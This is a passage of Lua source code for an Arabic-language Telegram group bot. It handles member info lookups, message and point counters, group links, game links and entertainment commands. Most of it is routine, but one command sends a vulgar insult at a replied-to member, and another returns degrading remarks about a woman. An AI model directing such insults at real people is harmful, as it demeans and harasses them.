bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
sm = bot.getChatMember(msg.chat_id,UserId_Info.id)
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المنشئ"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "المشرف"
else
gstatus = "العضو"
end
bot.sendText(msg.chat_id,msg.id,"*‹ : الايدي : *( "..(UserId_Info.id).." *)*\n*‹ : المعرف : *( [@"..(UserName).."] *)*\n*‹ : الرتبه : *( "..(Get_Rank(UserId_Info.id,msg.chat_id)).." *)*\n*‹ : الموقع : *( "..(gstatus).." *)*\n*‹ : عدد الرسائل : *( "..(redis:get(bot_id..":"..msg.chat_id..":"..UserId_Info.id..":message") or 1).." *) .*" ,"md",true)  
end
if text == 'ايدي' or text == 'كشف'  and msg.reply_to_message_id ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.username and UserInfo.username ~= "" then
uame = '@'..UserInfo.username
else
uame = 'لا يوجد'
end
sm = bot.getChatMember(msg.chat_id,Remsg.sender.user_id)
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المنشئ"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "المشرف"
else
gstatus = "العضو"
end
bot.sendText(msg.chat_id,msg.id,"*‹ : الايدي : *( "..(Remsg.sender.user_id).." *)*\n*‹ : المعرف : *( ["..(uame).."] *)*\n*‹ : الرتبه : *( "..(Get_Rank(Remsg.sender.user_id,msg.chat_id)).." *)*\n*‹ : الموقع : *( "..(gstatus).." *)*\n*‹ : عدد الرسائل : *( "..(redis:get(bot_id..":"..msg.chat_id..":"..Remsg.sender.user_id..":message") or 1).." *) .*" ,"md",true)  
end
if text and text:match('^كشف (%d+)$') or text and text:match('^ايدي (%d+)$') then
local UserName = text:match('^كشف (%d+)$') or text:match('^ايدي (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if UserInfo.username and UserInfo.username ~= "" then
uame = '@'..UserInfo.username
else
uame = 'لا يوجد'
end
sm = bot.getChatMember(msg.chat_id,UserName)
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المنشئ"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "المشرف"
else
gstatus = "العضو"
end
bot.sendText(msg.chat_id,msg.id,"*‹ : الايدي : *( "..(UserName).." *)*\n*‹ : المعرف : *( ["..(uame).."] *)*\n*‹ : الرتبه : *( "..(Get_Rank(UserName,msg.chat_id)).." *)*\n*‹ : الموقع : *( "..(gstatus).." *)*\n*‹ : عدد الرسائل : *( "..(redis:get(bot_id..":"..msg.chat_id..":"..UserName..":message") or 1).." *) .*" ,"md",true)  
end
if text == 'اوامر المسح' then
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = '‹ : مسح رسائلي .',data="delforme_"..msg.sender.user_id.."_1"}},
{{text ="‹ : مسح سحكاتي .",data="delforme_"..msg.sender.user_id.."_2"}},
{{text = '‹ : مسح جهاتي .',data="delforme_"..msg.sender.user_id.."_3"}},
{{text ="‹ : مسح نقاطي .",data="delforme_"..msg.sender.user_id.."_4"}},
}
}
bot.sendText(msg.chat_id,msg.id,'*‹ : اهلا بك بأوامر المسح اضغط على الزر لحذفهن .*',"md", true, false, false, false, reply_markup)
end
if text == ("احصائياتي") and tonumber(msg.reply_to_message_id) == 0 then  
local nummsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
local edit = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage")or 0
local addmem = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem") or 0
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = '‹ : الرسائل .',data="iforme_"..msg.sender.user_id.."_1"},{text ="( "..nummsg.." )",data="iforme_"..msg.sender.user_id.."_1"}},
{{text = '‹ : السحكات .',data="iforme_"..msg.sender.user_id.."_2"},{text ="( "..edit.." )",data="iforme_"..msg.sender.user_id.."_2"}},
{{text = '‹ : الجهات .',data="iforme_"..msg.sender.user_id.."_3"},{text ="( "..addmem.." )",data="iforme_"..msg.sender.user_id.."_3"}},
{{text = '‹ : المجوهرات .',data="iforme_"..msg.sender.user_id.."_4"},{text ="( "..Num.." )",data="iforme_"..msg.sender.user_id.."_4"}},
}
}
bot.sendText(msg.chat_id,msg.id,"*‹ : اهلا بك احصائياتك هي ⬇️ .*","md", true, false, false, false, reply_markup)
return false
end
if text == 'رتبتي' then
bot.sendText(msg.chat_id,msg.id,"*‹ : رتبتك : *( "..(Get_Rank(msg.sender.user_id,msg.chat_id)).." *) .*","md",true)  
return false
end
if text == 'سحكاتي' or text == 'تعديلاتي' then
bot.sendText(msg.chat_id,msg.id,"*‹ : عدد سحكاتك : *( "..(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0).." *) .*","md",true)  
return false
end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' then
bot.sendText(msg.chat_id,msg.id,'*‹ : تم مسح جميع سحكاتك .*',"md",true)
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage")
return false
end
if text == 'جهاتي' or text == 'اضافاتي' then
bot.sendText(msg.chat_id,msg.id,"*‹ : عدد جهاتك : *( "..(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem") or 0).." *) .*","md",true)  
return false
end
if text == 'تفاعلي' or text == 'نشاطي' then
bot.sendText(msg.chat_id,msg.id," .*"..Total_message((redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1)).." .*","md",true)  
return false
end
if text ==("مسح") and Vips(msg) and tonumber(msg.reply_to_message_id) > 0 then
if GetInfoBot(msg).Delmsg == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : ليس لدي صلاحيه حذف رسائل .*',"md",true)
return false
end
bot.deleteMessages(msg.chat_id,{[1]= msg.reply_to_message_id})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
end   
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' then
bot.sendText(msg.chat_id,msg.id,'*‹ : تم مسح جميع جهاتك .*',"md",true)
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem")
return false
end
if text == "منو ضافني" and not redis:get(bot_id..":"..msg.chat_id..":settings:addme") then
if bot.getChatMember(msg.chat_id,msg.sender.user_id).status.luatele == "chatMemberStatusCreator" then
bot.sendText(msg.chat_id,msg.id,"*‹ : انت منشئ المجموعه .*","md",true) 
return false
end
addby = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":AddedMe")
if addby then 
UserInfo = bot.getUser(addby)
Name = '['..UserInfo.first_name..'](tg://user?id='..addby..')'
bot.sendText(msg.chat_id,msg.id,"*‹ : تم اضافتك بواسطه  : (  .*"..(Name).." *) .*","md",true)  
else
bot.sendText(msg.chat_id,msg.id,"*‹ : قد قمت بالانضمام عبر الرابط .*","md",true) 
return false
end
end
if Constructor(msg) then
if text and text:match("^اضف نقاط (%d+)$") and tonumber(msg.reply_to_message_id) ~= 0 then
local Num = text:match("^اضف نقاط (%d+)$")
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
redis:incrby(bot_id..":"..msg.chat_id..":"..Remsg.sender.user_id..":game",string.match(text:match("^اضف نقاط (%d+)$"), "(%d+)"))  
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم اضافه ( "..string.match(text:match("^اضف نقاط (%d+)$"), "(%d+)").." ) رساله له .*").yu,"md",true)
return false
end
if redis:get(bot_id..":"..msg.chat_id..":settings:game:"..msg.sender.user_id) then
if text then
if text and text:match('^@(%S+)$') then
local UserName = text:match('^(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
redis:incrby(bot_id..":"..msg.chat_id..":"..UserId_Info.id..":game",redis:get(bot_id..":"..msg.chat_id..":settings:game:"..msg.sender.user_id))  
elseif text and text:match('^(%d+)$') then
local UserName = text:match('^(%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"*‹ : الايدي ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
redis:incrby(bot_id..":"..msg.chat_id..":"..UserName..":game",redis:get(bot_id..":"..msg.chat_id..":settings:game:"..msg.sender.user_id))  
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم اضافه ( "..redis:get(bot_id..":"..msg.chat_id..":settings:game:"..msg.sender.user_id).." ) رساله له .*").yu,"md",true)
redis:del(bot_id..":"..msg.chat_id..":settings:game:"..msg.sender.user_id)
return false
end
end
if text and text:match("^اضف نقاط (%d+)$") and tonumber(msg.reply_to_message_id) == 0 then
redis:setex(bot_id..":"..msg.chat_id..":settings:game:"..msg.sender.user_id,360,string.match(text:match("^اضف نقاط (%d+)$"), "(%d+)")) 
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل معرف او ايدي الشخص الان .*","md",true)   
end
if text and text:match("^اضف رسائل (%d+)$") and tonumber(msg.reply_to_message_id) ~= 0 then
local Num = text:match("^اضف رسائل (%d+)$")
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
redis:incrby(bot_id..":"..msg.chat_id..":"..Remsg.sender.user_id..":message",string.match(text:match("^اضف رسائل (%d+)$"), "(%d+)"))  
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم اضافه ( "..string.match(text:match("^اضف رسائل (%d+)$"), "(%d+)").." ) رساله له .*").yu,"md",true)
return false
end
if redis:get(bot_id..":"..msg.chat_id..":settings:addmsg:"..msg.sender.user_id) then
if text then
if text and text:match('^@(%S+)$') then
local UserName = text:match('^(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
redis:incrby(bot_id..":"..msg.chat_id..":"..UserId_Info.id..":message",redis:get(bot_id..":"..msg.chat_id..":settings:addmsg:"..msg.sender.user_id))
elseif text and text:match('^(%d+)$') then
local UserName = text:match('^(%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"*‹ : الايدي ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
redis:incrby(bot_id..":"..msg.chat_id..":"..UserName..":message",redis:get(bot_id..":"..msg.chat_id..":settings:addmsg:"..msg.sender.user_id))  
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم اضافه ( "..redis:get(bot_id..":"..msg.chat_id..":settings:addmsg:"..msg.sender.user_id).." ) رساله له .*").yu,"md",true)
redis:del(bot_id..":"..msg.chat_id..":settings:addmsg:"..msg.sender.user_id)
return false
end
end
if text and text:match("^اضف رسائل (%d+)$") and tonumber(msg.reply_to_message_id) == 0 then
redis:setex(bot_id..":"..msg.chat_id..":settings:addmsg:"..msg.sender.user_id,360,string.match(text:match("^اضف رسائل (%d+)$"), "(%d+)")) 
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل معرف او ايدي الشخص الان .*","md",true)   
end
end --- Constructor
redis:incr(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") 
if text == 'رسائلي' then
bot.sendText(msg.chat_id,msg.id,"*‹ : عدد رسائلك : *( "..(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1).." *)*","md",true)  
return false
end
if text == 'مسح رسائلي' then
bot.sendText(msg.chat_id,msg.id,'*‹ : تم مسح جميع رسائلك .*',"md",true)   
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message")
return false
end
if text == 'نقاطي' or text == 'مجوهراتي' then
bot.sendText(msg.chat_id,msg.id,"*‹ : عدد نقاطك : *( "..(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0).." *)*","md",true)  
return false
end
if text and text:match("^بيع نقاطي (%d+)$") then  
local end_n = text:match("^بيع نقاطي (%d+)$")
if tonumber(end_n) == tonumber(0) then
bot.sendText(msg.chat_id,msg.id,"*‹ : لا استطيع البيع اقل من 1 .*","md",true)  
return false 
end
if tonumber(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game")) == tonumber(0) then
bot.sendText(msg.chat_id,msg.id,"*‹ : ليس لديك جواهر من الالعاب .\n‹ : اذا كنت تريد ربح الجواهر .\n‹ : ارسل الالعاب وابدأ اللعب ! .*","md",true)  
else
local nb = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game")
if tonumber(end_n) > tonumber(nb) then
bot.sendText(msg.chat_id,msg.id,"*‹ : ليس لديك جواهر بهاذا العدد .\n‹ : لزيادة مجوهراتك في اللعبه .\n‹ : ارسل الالعاب وابدأ اللعب !*","md",true)  
return false
end
local end_d = string.match((end_n * 50), "(%d+)") 
bot.sendText(msg.chat_id,msg.id,"*‹ : تم خصم* *~ { "..end_n.." }* *من مجوهراتك* .\n*‹ : وتم اضافة* *~ { "..end_d.." }* *الى رسائلك .*","md",true)  
redis:decrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game",end_n)  
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message",end_d)  
end
return false 
end
if text == 'مسح نقاطي' or text == 'مسح مجوهراتي' then
bot.sendText(msg.chat_id,msg.id,'*‹ : تم مسح جميع نقاطك .*',"md",true)   
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game")
return false
end
if text == 'ايديي' then
bot.sendText(msg.chat_id,msg.id,"*‹ : ايديك : *( "..msg.sender.user_id.." *) .*","md",true)  
return false
end
if text == 'اسمي' and Administrator(msg) then
bot.sendText(msg.chat_id,msg.id," *‹ : اسمك : *( "..bot.getUser(msg.sender.user_id).first_name.." *) .*","md",true)  
return false
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:link") then
if text == 'الرابط' then
Get_Chat = bot.getChat(msg.chat_id)
Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
if redis:get(bot_id..":"..msg.chat_id..":link") then
link = redis:get(bot_id..":"..msg.chat_id..":link")
else
if Info_Chats.invite_link.invite_link then
link = Info_Chats.invite_link.invite_link
else
link = "لايوجد"
end
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = Get_Chat.title, url = link}},
}
}
bot.sendText(msg.chat_id,msg.id,": Link Group : *"..Get_Chat.title.."*\n ━═━═━═━═━═━═━═━\n","md", true, false, false, false, reply_markup)
return false
end
end
if text == 'المجموعه' or text == 'عدد الكروب' or text == 'عدد المجموعه' then
Get_Chat = bot.getChat(msg.chat_id)
Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}},
}
}
bot.sendText(msg.chat_id,msg.id,'\n*‹ : معلومات المجموعه :\n‹ : الايدي : ( '..msg.chat_id..' )\n‹ : عدد الاعضاء : '..Info_Chats.member_count..'\n‹ : عدد الادمنيه : '..Info_Chats.administrator_count..'\n‹ : عدد المطرودين : '..Info_Chats.banned_count..'\n‹ : عدد المقيدين : '..Info_Chats.restricted_count..'\n‹ : الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md",true, false, false, false, reply_markup)
return false
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:gameVip") then
if text == 'الالعاب الاحترافيه' and Vips(msg)  then
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text="♟ Chess Game ♟",url='https://t.me/T4TTTTBOT?game=chess'}},
{{text="لعبة فلابي بيرد 🐥",url='https://t.me/awesomebot?game=FlappyBird'},{text="تحداني فالرياضيات 🔢",url='https://t.me/gamebot?game=MathBattle'}},
{{text="تحداني في ❌⭕️",url='t.me/XO_AABOT?start3836619'},{text="سباق الدراجات 🏍",url='https://t.me/gamee?game=MotoFX'}},
{{text="سباق سيارات 🏎",url='https://t.me/gamee?game=F1Racer'},{text="متشابه 👾",url='https://t.me/gamee?game=DiamondRows'}},
{{text="كرة قدم ⚽",url='https://t.me/gamee?game=FootballStar'}},
{{text="دومنا🥇",url='https://vipgames.com/play/?affiliateId=wpDom/#/games/domino/lobby'},{text="❕ليدو",url='https://vipgames.com/play/?affiliateId=wpVG#/games/ludo/lobby'}},
{{text="ورق🤹‍♂",url='https://t.me/gamee?game=Hexonix'},{text="Hexonix❌",url='https://t.me/gamee?game=Hexonix'}},
{{text="MotoFx🏍️",url='https://t.me/gamee?game=MotoFx'}},
{{text="لعبة 2048 🎰",url='https://t.me/awesomebot?game=g2048'},{text="Squares🏁",url='https://t.me/gamee?game=Squares'}},
{{text="Atomic 1▶️",url='https://t.me/gamee?game=AtomicDrop1'},{text="Corsairs",url='https://t.me/gamebot?game=Corsairs'}},
{{text="LumberJack",url='https://t.me/gamebot?game=LumberJack'}},
{{text="LittlePlane",url='https://t.me/gamee?game=LittlePlane'},{text="RollerDisco",url='https://t.me/gamee?game=RollerDisco'}},
{{text="🦖 Dragon Game 🦖",url='https://t.me/T4TTTTBOT?game=dragon'},{text="🐍 3D Snake Game 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
{{text="🔵 Color Game 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
{{text="🚀 Rocket Game 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 Arrow Game 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
{{text = '‹ : 𝖲??𝗎𝖱??𝖾 𝖾𝗂𝗅𝖺𝗇𝖣 .',url="t.me/FeLX_TEaM"}},
}
}
bot.sendText(msg.chat_id,msg.id,'*‹ : قائمه الالعاب الاحترافيه اضغط للعب*',"md", true, false, false, false, reply_markup)
end
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:entertainment") then
if text == "شنو رئيك بهذا" or text == "شنو رئيك بهذ" then
local texting = {"ادب سسز يباوع علي بنات ??🥺"," مو خوش ولد 😶","زاحف وما احبه 😾😹"}
bot.sendText(msg.chat_id,msg.id,"*"..texting[math.random(#texting)].."*","md", true)
end
if text == "شنو رئيك بهاي" or text == "شنو رئيك بهايي" then
local texting = {"دور حلوين 🤕😹","جكمه وصخه عوفها ☹️😾","حقيره ومنتكبره 😶😂"}
bot.sendText(msg.chat_id,msg.id,"*"..texting[math.random(#texting)].."*","md", true)
end
if text == "هينه" or text == "رزله" or text == "هينها" or text == "رزلها" then
heen = {
"‹ : حبيبي علاج الجاهل التجاهل ."
,"‹ : مالي خلك زبايل التلي . "
,"‹ : كرامتك صارت بزبل פَــبي ."
,"‹ : مو صوجك صوج الكواد الزمك جهاز ."
,"‹ : لفارغ استجن . "
,"‹ : لتتلزك بتاجراسك ."
,"‹ : ملطلط دي ."
};
sendheen = heen[math.random(#heen)]
if tonumber(msg.reply_to_message_id) == 0 then
bot.sendText(msg.chat_id,msg.id,"*‹ : يجب عمل رد على رساله شخص*","md", true)
return false
end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if developer(Remsg) then
bot.sendText(msg.chat_id,msg.id,"*‹ : لا خاف عيب هذا مطوري*","md", true)
return false
end
bot.sendText(msg.chat_id,msg.reply_to_message_id,"*"..sendheen.."*","md", true)
end
if text == "كت" or  text == "كت تويت" then
local arr = {'آخر مرة زرت مدينة الملاهي؟','آخر مرة أكلت أكلتك المفضّلة؟','الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل','آخر شيء ضاع منك؟','كلمة أخيرة لشاغل البال؟','طريقتك المعتادة في التخلّص من الطاقة السلبية؟','شهر من أشهر العام له ذكرى جميلة معك؟','كلمة غريبة من لهجتك ومعناها؟🤓','‏- شيء سمعته عالق في ذهنك هاليومين؟','متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟','‏- أبرز صفة حسنة في صديقك المقرب؟','هل تشعر أن هنالك مَن يُحبك؟','اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟','أجمل شيء حصل معك خلال هاليوم؟','صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔','كلمة لشخص غالي اشتقت إليه؟💕','آخر خبر سعيد، متى وصلك؟','أنا آسف على ....؟','أوصف نفسك بكلمة؟','صريح، مشتاق؟','‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟','‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭','‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤','‏- تخيّل شيء قد يحدث في المستقبل؟','‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚','شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟','| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.','كم مره تسبح باليوم','نسبة النعاس عندك حاليًا؟','لو فقط مسموح شخص واحد تتابعه فالسناب مين بيكون ؟','يهمك ملابسك تكون ماركة ؟','وش الشيء الي تطلع حرتك فيه و زعلت ؟','عندك أخوان او خوات من الرضاعة؟','عندك معجبين ولا محد درا عنك؟','أطول مدة قضيتها بعيد عن أهلك ؟','لو يجي عيد ميلادك تتوقع يجيك هدية؟','يبان عليك الحزن من " صوتك - ملامحك','وين تشوف نفسك بعد سنتين؟','وش يقولون لك لما تغني ؟','عندك حس فكاهي ولا نفسية؟','كيف تتصرف مع الشخص الفضولي ؟','كيف هي أحوال قلبك؟','حاجة تشوف نفسك مبدع فيها ؟','متى حبيت؟','شيء كل م تذكرته تبتسم ...','العلاقه السريه دايماً تكون حلوه؟','صوت مغني م تحبه','لو يجي عيد ميلادك تتوقع يجيك هدية؟','اذا احد سألك عن شيء م تعرفه تقول م اعرف ولا تتفلسف ؟','مع او ضد : النوم افضل حل لـ مشاكل الحياة؟','مساحة فارغة (..............) اكتب اي شيء تبين','اغرب اسم مر عليك ؟','عمرك كلمت فويس احد غير جنسك؟','اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟','لو عندك فلوس وش السيارة اللي بتشتريها؟','وش اغبى شيء سويته ؟','شيء من صغرك ماتغير فيك؟','وش نوع الأفلام اللي تحب تتابعه؟','وش نوع الأفلام اللي تحب تتابعه؟','تجامل احد على حساب مصلحتك ؟','تتقبل النصيحة من اي شخص؟','كلمه ماسكه معك الفترة هذي ؟','متى لازم تقول لا ؟','اكثر شيء تحس انه مات ف مجتمعنا؟','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','هل تعتقد أن هنالك من يراقبك بشغف؟','اشياء اذا سويتها لشخص تدل على انك تحبه كثير ؟','اشياء صعب تتقبلها بسرعه ؟','اقتباس لطيف؟','أكثر جملة أثرت بك في حياتك؟','عندك فوبيا من شيء ؟.','اكثر لونين تحبهم مع بعض؟','أجمل بيت شعر سمعته ...','سبق وراودك شعور أنك لم تعد تعرف نفسك؟','تتوقع فيه احد حاقد عليك ويكرهك ؟','أجمل سنة ميلادية مرت عليك ؟','لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟','وش تحس انك تحتاج الفترة هاذي ؟','يومك ضاع على؟','@منشن .. شخص تخاف منه اذا عصب ...','فيلم عالق في ذهنك لا تنساه مِن روعته؟','تختار أن تكون غبي أو قبيح؟','الفلوس او الحب ؟','أجمل بلد في قارة آسيا بنظرك؟','ما الذي يشغل بالك في الفترة الحالية؟','احقر الناس هو من ...','وين نلقى السعاده برايك؟','اشياء تفتخر انك م سويتها ؟','تزعلك الدنيا ويرضيك ؟','وش الحب بنظرك؟','افضل هديه ممكن تناسبك؟','كم في حسابك البنكي ؟','كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟','عمرك انتقمت من أحد ؟!','ما السيء في هذه الحياة ؟','غنية عندك معاها ذكريات🎵🎻','/','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أطول مدة نمت فيها كم ساعة؟','أصعب قرار ممكن تتخذه ؟','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أنت محبوب بين الناس؟ ولاكريه؟','إحساسك في هاللحظة؟','اخر شيء اكلته ؟','تشوف الغيره انانيه او حب؟','اذكر موقف ماتنساه بعمرك؟','اكثر مشاكلك بسبب ؟','اول ماتصحى من النوم مين تكلمه؟','آخر مرة ضحكت من كل قلبك؟','لو الجنسية حسب ملامحك وش بتكون جنسيتك؟','اكثر شيء يرفع ضغطك','اذكر موقف ماتنساه بعمرك؟','لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .','كيف تشوف الجيل ذا؟','ردة فعلك لو مزح معك شخص م تعرفه ؟','احقر الناس هو من ...','تحب ابوك ولا امك','آخر فيلم مسلسل والتقييم🎥؟','أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟','كلمة لأقرب شخص لقلبك🤍؟','حط@منشن لشخص وقوله "حركتك مالها داعي"??!','اذا جاك خبر مفرح اول واحد تعلمه فيه مين💃🏽؟','طبع يمكن يخليك تكره شخص حتى لو كنتتُحبه🙅🏻‍♀️؟','افضل ايام الاسبوع عندك🔖؟','يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة🏙؟','تاريخ لن تنساه📅؟','تحب الصيف والا الشتاء❄️☀️؟','شخص تحب تستفزه😈؟','شنو ينادونك وانت صغير (عيارتك)👼🏻؟','عقل يفهمك/ج ولا قلب يحبك/ج❤️؟','اول سفره لك وين رح تكون✈️؟','كم عدد اللي معطيهم بلوك👹؟','نوعية من الأشخاص تتجنبهم في حياتك❌؟','شاركنا صورة او فيديو من تصويرك؟📸','كم من عشره تعطي حظك📩؟','اكثر برنامج تواصل اجتماعي تحبه😎؟','من اي دوله انت🌍؟','اكثر دوله ودك تسافر لها🏞؟','مقولة "نكبر وننسى" هل تؤمن بصحتها🧓🏼؟','تعتقد فيه أحد يراقبك👩🏼‍💻؟','لو بيدك تغير الزمن ، تقدمه ولا ترجعه🕰؟','مشروبك المفضل🍹؟','‏قم بلصق آخر اقتباس نسخته؟💭','كم وزنك/ج طولك/ج؟🌚','كم كان عمرك/ج قبل ٨ سنين😈؟','دوله ندمت انك سافرت لها😁؟','لو قالو لك ٣ أمنيات راح تتحقق عالسريع شنو تكون🧞‍♀️؟','‏- نسبة احتياجك للعزلة من 10📊؟','شخص تحبه حظرك بدون سبب واضح، ردة فعلك🧐؟','مبدأ في الحياة تعتمد عليه دائما🕯؟'}
bot.sendText(msg.chat_id,msg.id,arr[math.random(#arr)],"md", true)
end 
if text == "منشن" or  text == "@" then
local arr = {'⟨ @L¹ ممكن إغنيهَ لطيفة ⟩','⟨ @L² نتعرف بإلطف ⟩','⟨ @L³ ٱتصال لطيف ⟩','⟨ @L⁴ نزل صورتك وأنا إقيم من ٪١٠٠ ⟩','⟨ @L⁵ تعال أعترفلك بشي ⟩','⟨ @L⁶ همسة لطيفه ⟩','⟨ @L⁷ نروح للسينما ؟ ⟩','⟨ @L⁸ ٱتحداك تكلي احبك ⟩','⟨ @L⁹ تعال/ي نطمس  ⟩','⟨ @L¹⁰ نصعد إتصال وتشغل أغنية ع ذوقك ؟ ⟩','⟨ @L¹ شنو لونك إلمفضل ؟ ⟩','⟨ @L² اذا اتعارك تفزعلي ؟ ⟩','⟨ @L³ اعزمك بمطعم فخم تجي ؟ ⟩','⟨ @L⁴ تحبني بكد م إحبك ؟ ⟩','⟨ @L⁵ اهديلي شيء وهديلك ⟩','⟨ @L⁶ نزوج ونطفر منل تلي ؟ ⟩','⟨ @L⁷ تاك للي تحبة هنا  ⟩','⟨ @L⁸ تعال نشاهد فلم سوا ⟩','⟨ @L⁹ دزلي شيء يخليني إكلك شكراً ⟩','⟨ @L¹⁰ شكد صارلك بالتلي ⟩ '}
bot.sendText(msg.chat_id,msg.id,arr[math.random(#arr)],"md", true)
end
if text == "احسب" then
